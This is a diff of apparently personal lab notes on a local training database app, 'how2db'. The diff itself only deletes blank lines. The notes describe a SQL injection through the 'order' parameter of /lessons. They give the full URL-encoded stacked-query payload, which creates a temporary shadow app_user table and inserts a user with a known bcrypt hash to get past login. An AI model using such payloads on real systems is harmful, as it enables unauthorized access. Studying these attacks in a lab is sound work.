@@ -21,7 +21,6 @@ jdbc: what Java uses to connect to databases
 - AuthInterceptor applies when /playground/** is accessed.
 - Submit query with POST /playground/query.
 - This will not work unless logged in.
-
 - One source of users is the app_user database.
 - PostgreSQL → lesson, app_user tables.
 - MariaDB → country, extdb tables.
@@ -67,7 +66,6 @@ However, we can still create a temporary shadow `app_user` table:
 ```bash
 docker compose exec postgres psql -U readonly -d how2db
 ```
-
 ```sql
 id; 
 
@@ -88,7 +86,6 @@ salt = bcrypt.gensalt()
 _hash = bcrypt.hashpw(b'password', salt).decode()
 print(_hash)  # $2b$12$/Agye3huI5ZtqgrcvnW68ODI/O1JhlncSJSCeHOPsmJjHm.Ts9cGO
 ```
-
 ```
 http://localhost:9090/lessons?order=id;%20%0D%0A%0D%0ACREATE%20TEMP%20TABLE%20app%5Fuser%20(%0D%0A%20%20%20%20id%20%20%20%20%20%20%20%20%20%20%20%20BIGINT%20GENERATED%20BY%20DEFAULT%20AS%20IDENTITY%20PRIMARY%20KEY,%0D%0A%20%20%20%20username%20%20%20%20%20%20VARCHAR(64)%20%20NOT%20NULL%20UNIQUE,%0D%0A%20%20%20%20password%5Fhash%20VARCHAR(100)%20NOT%20NULL%0D%0A);%0D%0A%0D%0AINSERT%20INTO%20app%5Fuser%20(username,%20password%5Fhash)%20VALUES%20('vincent',%20'$2b$12$/Agye3huI5ZtqgrcvnW68ODI/O1JhlncSJSCeHOPsmJjHm%2ETs9cGO');
 ```
